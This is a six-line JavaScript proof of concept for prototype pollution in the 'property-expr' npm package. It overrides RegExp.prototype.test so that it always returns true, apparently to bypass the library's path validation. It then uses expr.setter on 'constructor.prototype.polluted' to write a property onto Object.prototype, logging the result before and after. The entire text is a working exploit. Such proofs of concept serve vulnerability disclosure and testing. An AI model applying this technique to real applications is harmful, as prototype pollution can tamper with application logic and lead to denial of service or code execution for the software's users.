RegExp.prototype.test = () => true;
let expr = require('property-expr');
obj = {};
console.log({}.polluted);
expr.setter('constructor.prototype.polluted')(obj, 'yes');
console.log({}.polluted);